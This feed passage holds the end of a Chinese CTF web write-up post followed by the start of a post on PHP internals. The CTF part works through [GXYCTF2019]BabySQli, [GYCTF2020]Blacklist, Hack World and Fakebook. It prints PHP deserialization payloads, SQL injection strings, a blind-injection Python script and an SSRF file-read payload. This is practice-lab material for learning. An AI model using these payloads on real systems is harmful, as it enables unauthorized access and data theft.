class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-comment">//</span><br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-comment">//这个地方强制转换，得想办法处理</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-keyword">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;process();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(ord(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; ord(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))   <span class="hljs-comment">//传参必须是 ascii 可显示字符</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(is_valid(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = unserialize(<span class="hljs-variable">$str</span>);      <span class="hljs-comment">//反序列化 str变量</span><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这个 op &#x3D; 1 不太想用，看 &#x3D;2 的情况</p><p>我们需要解决一下几个问题：</p><ul><li>protect之后的特殊字符</li><li>if($this-&gt;op &#x3D;&#x3D;&#x3D; “2”)</li></ul><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201102232636.png" alt="image-20220110223245549"></p><p>可见，题目环境 PHP_version &gt;7.1 因此我们可以直接把 protected &#x3D;&gt; public，因为7.1以上版本对类属性不敏感</p><p>而if的强比较可以 赋值 int(2) 这样 int!&#x3D;string 因此也破坏了比较</p><p>于是有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;./flag.php&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>=<span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> FileHandler();<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A10%3A%22.%2Fflag.php%22%3Bs%3A7%3A%22content%22%3Bs%3A0%3A%22%22%3B%7D</span><br></code></pre></td></tr></table></figure><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>我不会</p><p>看了看wp，发现在查询之后源码中会有一个hint</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br>base32 -&gt; base64 : select * from user where username = &#x27;$name&#x27;<br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs">可以了解到这里 只查了 username 但是没有检查 passwd 字段，就是说然后怎么办，一定还是有判断的，但是是体现在后端处理逻辑这里，实时也是如此，这里如果我们用 Union select 的话查到没有的字段就会自己创建一个虚拟的出来</code></pre></div><p>这题一共有三个字段 <code>admin&#39; union select 1,2,3,4#</code> </p><p>报错： Error: The used SELECT statements have a different number of columns</p><p>因此有三个字段</p><p>因此我们的 测试的基础是 <code>admin&#39; union select 1,2,3#</code></p><p>一般这种都是 id username passwd 对吧</p><p>于是 有 <code>admin&#39; union select 1,&#39;admin&#39;,3#</code></p><div class="code-wrapper"><pre><code class="hljs">那么还有一个passwd 这就是 后端匹配密码实际匹配的MD5处理后的结果，依照上面说的其实union select 只有查到完全一模一样的数据才会虚拟一个出来，那我们这里passwd字段可控 于是可以自定义密码直接传</code></pre></div><p>最后有 <code>1&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#</code></p><p>MD5解密结果是123</p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>额，算是强网杯那道的pro版本</p><p>基本这种算是固定 而且吃知识的直接记住吧</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><span class="hljs-number">1</span>&#x27;;handler FlagHere <span class="hljs-keyword">open</span>;handler FlagHere <span class="hljs-keyword">read</span> first;handler FlagHere <span class="hljs-keyword">close</span><span class="hljs-comment">;#</span><br></code></pre></td></tr></table></figure><blockquote><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p></blockquote><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>脚本…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://d6bebfbc-0aab-4008-8fc6-6bf8134438ed.node4.buuoj.cn:81/index.php&quot;</span><br><br>result = <span class="hljs-string">&quot;&quot;</span><br>num = <span class="hljs-number">0</span>  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">60</span>):<br><br>    <span class="hljs-keyword">if</span> num == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">128</span>):<br><br>        payload = <span class="hljs-string">&quot;if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)&quot;</span> % (i, j)<br><br>        data = &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>: payload,<br>        &#125;<br><br>        r = requests.post(url, data=data)<br><br>        r.encoding = r.apparent_encoding<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            x = <span class="hljs-built_in">chr</span>(j)<br>            result += <span class="hljs-built_in">str</span>(x)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#125;&quot;</span> <span class="hljs-keyword">in</span> result:<br>            <span class="hljs-built_in">print</span>(result)<br>            num = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>看了看只有两个功能，一定是有一个功能在执行中可以修改一些字段达到利用的目的</p><p>访问 robots.txt 得到 备份路径 &#x2F;user.php.bak 访问下载</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = curl_init();<br><br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        curl_close(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>一个很明显的ssrf</p><p>牛逼，我卡住了，原来在view.php哪里还有一个sql注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">view.php?<span class="hljs-keyword">no</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>#<br></code></pre></td></tr></table></figure><p>并确定了 2 的位置 为可回显的位置</p><p>构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>  </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;a&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$data</span> = <span class="hljs-keyword">new</span> UserInfo();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$data</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>最后</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">view</span>.php?no=-<span class="hljs-number">1</span>/**/union/**/select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database(),&#x27;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;#<br></code></pre></td></tr></table></figure><p>一开始我以为flag会直接体现在注释里</p><p>直到我发现</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121318798.png" alt="image-20220112131756625"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CTF" scheme="https://d3n13d.github.io/categories/CTF/"/>
    
    
    <category term="Web" scheme="https://d3n13d.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>PHP内核学习及部分样例</title>
    <link href="https://d3n13d.github.io/2022/01/11/PHP%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E5%8F%8A%E9%83%A8%E5%88%86%E6%A0%B7%E4%BE%8B/"/>
    <id>https://d3n13d.github.io/2022/01/11/PHP%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E5%8F%8A%E9%83%A8%E5%88%86%E6%A0%B7%E4%BE%8B/</id>
    <published>2022-01-11T03:55:42.000Z</published>
    <updated>2022-01-11T03:58:27.032Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="内核剖析"><a href="#内核剖析" class="headerlink" title="内核剖析"></a>内核剖析</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><ul><li><p><strong>build</strong> 放置和源码编译相关的文件，比如 buildconf，和检查环境的脚本</p></li><li><p><strong>ext</strong>     拓展目录，所有非php基础功能比如 <strong>substring</strong> 都在这个目录以下</p></li><li><p><strong>main</strong>   PHP基础设施</p></li><li><p><strong>Zend</strong>   Zend主要实现语言核心的运行环境，比如脚本语法解析，opcode执行及其拓展机制</p></li><li><p><strong>pear</strong>    PHP拓展与应用仓库，包含PEAR核心文件</p></li><li><p><strong>sapi</strong>    和各种服务器的接口调用，例如apache、IIS等，也包含一般的fastcgi、cgi等</p></li><li><p><strong>win32</strong>    Windows环境下编译PHP有关脚本</p></li><li><p><strong>TSRM</strong>     线程安全目录</p></li></ul><h3 id="PHP生命周期"><a href="#PHP生命周期" class="headerlink" title="PHP生命周期"></a>PHP生命周期</h3><p>​    SAPI指PHP具体应用的编程接口，一切以 <strong>SAPI 开始</strong>，无论是php-cli，还是php-server。比如我们命令行参数传递给PHP解释器要执行的脚本，相当于是通过URL请求了一个PHP页面。</p><p>​    PHP 执行的两个阶段，处理请求之前的开始阶段，请求之后的结束阶段。</p><p>​    处理请求之前的的开始阶段包括 ：</p><p>​        1️⃣ 模块初始化阶段 (MINIT)，只执行一次</p><p>​        2️⃣ 模块激活阶段 (RINIT)</p><h4 id="单进程的SAPI生命周期"><a href="#单进程的SAPI生命周期" class="headerlink" title="单进程的SAPI生命周期"></a>单进程的SAPI生命周期</h4><p><strong>CLI&#x2F;CGI模式</strong>都属于单进程的SASPI模式</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201101726955.png" alt="image-20220110172604804"></p><p>如图完成了一个 接受参数 -&gt; 创建进程 -&gt; 处理请求 -&gt; 销毁进程 -&gt; 终止进程的操作</p><h4 id="多进程的SAPI生命周期"><a href="#多进程的SAPI生命周期" class="headerlink" title="多进程的SAPI生命周期"></a>多进程的SAPI生命周期</h4><p>​    通常PHP是<strong>编译一个中间件的模块</strong>来处理PHP请求。Apache一般会采取多进程模式。Apache会fork出多个子进程，每个进程内存空间相对独立，整个进程的生命周期会处理多个请求，只有apache关闭或者进程结束后才会进行关闭阶段。</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201101732820.png" alt="image-20220110173239751"></p><p>多线程的SAPI生命周期和 多进程类似，不同的是多线程是在生命周期里<strong>并行的重复 请求 关闭的阶段</strong></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201101733999.png" alt="image-20220110173308947"></p><h3 id="SAPI概述"><a href="#SAPI概述" class="headerlink" title="SAPI概述"></a>SAPI概述</h3><p>​    PHP中和服务相关的操作都是通过SAPI的接口实现</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201101735370.png" alt="image-20220110173552318"></p><p>​    各个服务的抽象层值之间遵守着相同的约定，这里称之为 SAPI 接口。每个SAPI实现都是一个 _sapi_moudle_struct 结构体变量。</p><p>​    demo:</p><figure class="highlight c"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">php_cgi_startup</span><span class="hljs-params">(sapi_module_struct *sapi_module)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (php_module_startup(sapi_module, &amp;cgi_module_entry, <span class="hljs-number">1</span>) == FAILURE) &#123;<br><span class="hljs-keyword">return</span> FAILURE;<br>&#125;<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure><p>经过测试这个返回值是 string(6) “SUCCESS”，而且可以用作条件判断</p><p><code>if(php_cgi_startup())&#123; echo 1;&#125;</code></p><p>如果 SUCCESS，输出1</p><h3 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h3><p>**CGI **能实现语言解释器与web服务器的通信。</p><p><strong>FastCGI</strong> 服务器中间件和某个语言后端 进行数据交换的协议，它可以一直执行，还可以支持分布式运算</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201102325878.png" alt="image-20220110232512816"></p><h2 id="PHP脚本执行"><a href="#PHP脚本执行" class="headerlink" title="PHP脚本执行"></a>PHP脚本执行</h2><blockquote><p>从这里开始就开始分几个二级标题，因为我觉得这已经脱离了前置知识的范畴</p></blockquote><p>​    先来说一说PHP，PHP是解释性语言，它无需编译即可“直接运行”</p><p>​    但是我们知道最底层是机器语言，实际上还是要有一个转换过程的，这个时候就回需要一个<strong>解释器</strong>，由解释器来执行这些代码，一般会在运行时实时编译，以此来提高效率。PHP为了提高执行效率，提出了opcode缓存拓展(APC,xcache,eAccelerator等)，这样就可以避免重新编译带来的性能损失。</p><p>​    一般来说，程序会经过这样的阶段：</p><p>​        1️⃣传递给php需要执行的文件</p><p>​        2️⃣php完成准备工作后启动PHP及Zend虚拟机，加载注册的拓展模块</p><p>​        3️⃣读取脚本，Zend引擎对脚本文件进行词法分析，语法分析</p><p>​        4️⃣编译为opcode</p><p>对于语法分析见($PHP_SRC&#x2F;Zend&#x2F;zend_language_parser)，它将源代码切成数组</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201110002241.png" alt="image-20220111000256180"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">union</span> _<span class="hljs-title">zend_value</span> &#123;</span>   <span class="hljs-comment">//变量存储在这个联合体里</span><br>zend_long         lval;<span class="hljs-comment">/* long value */</span><br><span class="hljs-keyword">double</span>            dval;<span class="hljs-comment">/* double value */</span><br>zend_refcounted  *counted;<br>zend_string      *str;<br>zend_array       *arr;<br>zend_object      *obj;<br>zend_resource    *res;<br>zend_reference   *ref;   <span class="hljs-comment">//引用次数</span><br>zend_ast_ref     *ast;<br>zval             *zv;<br><span class="hljs-keyword">void</span>             *ptr;<br>zend_class_entry *ce;<br>zend_function    *func;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-keyword">uint32_t</span> w1;<br><span class="hljs-keyword">uint32_t</span> w2;<br>&#125; ww;<br>&#125; zend_value;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">zval_struct</span> &#123;</span><br>zend_value        value;<span class="hljs-comment">/* value */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>ZEND_ENDIAN_LOHI_3(<br>zend_uchar    type,<span class="hljs-comment">/* active type */</span><br>zend_uchar    type_flags,<br><span class="hljs-keyword">union</span> &#123;<br><span class="hljs-keyword">uint16_t</span>  extra;        <span class="hljs-comment">/* not further specified */</span><br>&#125; u)<br>&#125; v;<br><span class="hljs-keyword">uint32_t</span> type_info;<br>&#125; u1;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-keyword">uint32_t</span>     next;                 <span class="hljs-comment">/* hash collision chain */</span><br><span class="hljs-keyword">uint32_t</span>     cache_slot;           <span class="hljs-comment">/* cache slot (for RECV_INIT) */</span><br><span class="hljs-keyword">uint32_t</span>     opline_num;           <span class="hljs-comment">/* opline number (for FAST_CALL) */</span><br><span class="hljs-keyword">uint32_t</span>     lineno;               <span class="hljs-comment">/* line number (for ast nodes) */</span><br><span class="hljs-keyword">uint32_t</span>     num_args;             <span class="hljs-comment">/* arguments number for EX(This) */</span><br><span class="hljs-keyword">uint32_t</span>     fe_pos;               <span class="hljs-comment">/* foreach position */</span><br><span class="hljs-keyword">uint32_t</span>     fe_iter_idx;          <span class="hljs-comment">/* foreach iterator index */</span><br><span class="hljs-keyword">uint32_t</span>     access_flags;         <span class="hljs-comment">/* class constant access flags */</span><br><span class="hljs-keyword">uint32_t</span>     property_guard;       <span 